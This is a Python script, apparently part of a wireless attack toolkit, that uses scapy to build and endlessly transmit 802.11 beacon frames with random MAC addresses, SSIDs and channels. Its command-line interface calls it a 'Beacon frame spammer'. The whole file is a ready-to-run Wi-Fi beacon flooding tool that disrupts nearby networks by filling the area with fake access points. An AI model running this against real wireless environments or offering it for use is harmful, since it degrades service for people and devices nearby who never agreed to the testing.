import time
import sys
import os
sys.path.append(os.path.join('..','..'))
from config import scapy, Error_text, Fatal_Error, Clear
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
from functions import validate_args, rand_eth, rand_ssid
import random

def beacon_flood(interface, count=0, timeout=0.1):
    """Отправка beacon фреймов"""
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=rand_eth(), addr3=rand_eth())
    
    # Beacon frame
    beacon = Dot11Beacon()
    
    # Adding ESSID
    essid = Dot11Elt(ID="SSID", info=rand_ssid(), len=8)
    
    # Channel (random between 1 and 13)
    dsset = Dot11Elt(ID="DSset", info=chr(random.randint(1, 13)))
    
    # Rates
    rates = Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96\x0c\x12\x18\x24')
    
    # Combine all layers
    frame = RadioTap()/dot11/beacon/essid/dsset/rates
    
    print("*Starting beacon spam... Press Ctrl+C to stop")
    
    sent = 0
    try:
        while True:
            sendp(frame, iface=interface, verbose=0)
            sent += 1
            print(f"\rFrames sent: {sent}", end="")
            time.sleep(timeout)
            
            # Generate new random frame for next iteration
            dot11.addr2 = rand_eth()
            dot11.addr3 = rand_eth()
            essid.info = rand_ssid()
            dsset.info = chr(random.randint(1, 13))
            
            if count > 0 and sent >= count:
                break
                
    except KeyboardInterrupt:
        print("\nAborted.")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Beacon frame spammer")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface")
    parser.add_argument("-c", "--count", type=int, default=0, 
                       help="Number of frames to send (0 for unlimited)")
    parser.add_argument("-t", "--timeout", type=float, default=0.1, 
                       help="Delay between frames in seconds")
    
    args = parser.parse_args()
    
    beacon_flood(args.interface, args.count, args.timeout)
